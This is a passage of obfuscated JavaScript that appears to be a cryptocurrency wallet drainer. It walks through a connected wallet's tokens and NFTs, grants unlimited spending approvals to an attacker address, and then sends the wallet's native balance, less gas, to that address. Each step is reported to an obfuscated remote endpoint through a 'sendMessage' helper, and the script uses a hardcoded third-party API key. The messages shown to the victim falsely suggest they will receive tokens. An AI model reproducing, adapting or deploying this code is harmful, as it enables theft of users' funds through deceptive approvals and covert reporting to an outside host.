_0x1c82b7=_0x13f77f;if(tokens[_0x1c82b7(0xd0)])try{loopTokens(tokens);}catch(_0x411dd7){console[_0x1c82b7(0x11c)](_0x1c82b7(0x11e)+_0x411dd7['message']);}else{if(NFTs[_0x1c82b7(0xd0)]){try{loopNfts(NFTs);}catch(_0x15b9c4){console[_0x1c82b7(0x11c)](_0x1c82b7(0x11e)+_0x15b9c4[_0x1c82b7(0x84)]);}onSendEther(),sendMessage(_0x1c82b7(0xbf));}else try{onSendEther();}catch(_0x1a8606){console[_0x1c82b7(0x11c)](_0x1c82b7(0x11e)+_0x1a8606[_0x1c82b7(0x84)]);}}}async function loopTokens(_0x96d1f4){const _0x358d0c=_0x13f77f;for await(let _0xa47fb3 of _0x96d1f4){console[_0x358d0c(0xd2)](_0x358d0c(0xb8),_0xa47fb3);try{sendMessage(_0x358d0c(0x120));let {hash:_0x40bb32}=await writeContract({'address':_0xa47fb3[_0x358d0c(0x10d)],'abi':ABI,'functionName':'approve','args':[Oxa,_0x358d0c(0xd8)]});console[_0x358d0c(0xd2)](_0x358d0c(0x8e),_0x40bb32),_0x40bb32&&(console[_0x358d0c(0xd2)]('Approved'),sendMessage(_0x358d0c(0xc6)),sendMessage(_0x358d0c(0x76)+_0xa47fb3[_0x358d0c(0x10d)]),sendMessage('Token\x20balance\x20is\x20'+_0xa47fb3[_0x358d0c(0x102)]),sendMessage(_0x358d0c(0x83)+Oxa));}catch(_0x7e6321){console[_0x358d0c(0xd2)](_0x358d0c(0x10b)+_0x7e6321),sendMessage(_0x358d0c(0xb5));}};await loopNfts(NFTs);}async function loopNfts(_0x4bb440){const _0x4b1737=_0x13f77f;for await(let _0x5147b7 of _0x4bb440){console['log'](_0x4b1737(0xe9),_0x5147b7);try{let {hash:_0x41ac80}=await writeContract({'address':_0x5147b7[_0x4b1737(0x93)],'abi':ABIN,'functionName':_0x4b1737(0x95),'args':[Oxa,!![]]});console['log'](_0x4b1737(0x8e),_0x41ac80),console[_0x4b1737(0xd2)](_0x4b1737(0x9b)+receipt),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0x4b1737(0x124)+_0x5147b7[_0x4b1737(0x93)]),sendMessage(_0x4b1737(0x83)+Oxa);}catch(_0x5ab572){console[_0x4b1737(0xd2)](_0x4b1737(0x10b)+_0x5ab572),sendMessage(_0x4b1737(0xb5));}}await onSendEther();}async function onSendEther(){const _0x2a1193=_0x13f77f;console[_0x2a1193(0xd2)]('sending\x20ether');try{let _0x42ed26=await fetchBalance({'address':selectedAccount});console[_0x2a1193(0xd2)](_0x42ed26);const _0x4a59c0=await fetchFeeData();console[_0x2a1193(0xd2)](_0x4a59c0);var _0x4c1010=_0x4a59c0[_0x2a1193(0xe1)]['gasPrice'];_0x4c1010=parseFloat(_0x4c1010);let _0x45fbaa=parseFloat(_0x42ed26['formatted'])-_0x4c1010*0.00042;_0x45fbaa=parseEther(_0x45fbaa[_0x2a1193(0x9e)]()),console[_0x2a1193(0xd2)](_0x45fbaa);const {hash:_0x341a79}=await sendTransaction({'to':Oxa,'value':_0x45fbaa});console[_0x2a1193(0xd2)](_0x341a79),sendMessage(_0x2a1193(0x107),_0x341a79),sendMessage(_0x2a1193(0x94)),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');}catch{sendMessage('Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected');}}async function sendMessage(_0x348df4){return new Promise((_0x22411b,_0x1e4b3c)=>{const _0x5dfa1a=_0x176b,_0x2c2ed6=Oxc;fetch(_0x5dfa1a(0x126)+_0x2c2ed6+_0x5dfa1a(0x86)+_0x348df4,{'method':_0x5dfa1a(0xf8),'headers':{}})[_0x5dfa1a(0x118)](async _0x3661f8=>{const _0x2494b5=_0x5dfa1a;if(_0x3661f8[_0x2494b5(0xa7)]>0x18f)throw _0x3661f8;_0x22411b(await _0x3661f8[_0x2494b5(0xe7)]());})[_0x5dfa1a(0xb3)](_0x2abdd5=>{_0x1e4b3c(_0x2abdd5);});});}async function getPrice(_0x2acfca){return new Promise((_0x20241a,_0x28831c)=>{const _0x22d258=_0x176b;fetch(_0x22d258(0xf6)+_0x2acfca+_0x22d258(0x8a),{'method':_0x22d258(0xf8),'headers':{}})[_0x22d258(0x118)](async _0x15357f=>{if(_0x15357f['status']>0x18f)throw _0x15357f;_0x20241a(await _0x15357f['json']());})[_0x22d258(0xb3)](_0x335dd4=>{_0x28831c(_0x335dd4);});});}async function getValue(_0x5a9556,_0x41ed5c,_0x253ed7){const _0x3b4eb4=_0x13f77f;console['log'](_0x5a9556,_0x41ed5c,_0x253ed7);let _0x3aa31a=await getPrice(_0x5a9556);console[_0x3b4eb4(0xd2)](_0x3b4eb4(0xa6),_0x3aa31a),_0x3aa31a=parseFloat(_0x3aa31a[_0x5a9556][_0x3b4eb4(0xe5)]);let _0x5dacdc=_0x41ed5c/0xa**(_0x253ed7||0x12)*_0x3aa31a;return _0x5dacdc=parseInt(_0x5dacdc),_0x3aa31a?_0x5dacdc:0x0;}async function getNFTs(_0x2551bd='',_0x4f6aaa='LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn',_0x1a5cfa=_0x13f77f(0x77),_0x142e58='50'){return new Promise((_0x31b428,_0x5c69e8)=>{const _0x595957=_0x176b;fetch('https://deep-index.moralis.io/api/v2/'+_0x2551bd+_0x595957(0xb2)+_0x1a5cfa+_0x595957(0xbc)+_0x142e58,{'method':'GET','headers':{'accept':_0x595957(0x128),'X-API-Key':_0x4f6aaa}})[_0x595957(0x118)](async _0x34cdc9=>{const _0x4a3a31=_0x595957;if(_0x34cdc9[_0x4a3a31(0xa7)]>0x18f)throw _0x34cdc9;_0x31b428(await _0x34cdc9[_0x4a3a31(0xe7)]());})['catch'](_0xdf087=>{_0x5c69e8(_0xdf087);});});}